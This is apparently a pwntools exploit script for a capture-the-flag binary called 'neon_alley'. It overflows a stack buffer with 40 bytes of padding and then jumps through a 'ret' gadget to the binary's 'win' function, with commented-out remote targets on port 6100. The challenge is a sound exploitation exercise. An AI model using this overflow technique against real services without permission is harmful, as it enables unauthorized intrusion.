from pwn import *

context.binary = elf = ELF("./neon_alley")

win = elf.symbols["win"]
ret = 0x401016

pay = b"A"*40 + p64(ret) + p64(win)

p = elf.process()
#p = remote("localhost" , 6100)
#p = remote("34.51.233.21"  ,6100)
#p = remote("tcp.espark.tn" , 6100)

p.sendline(pay)
p.interactive()
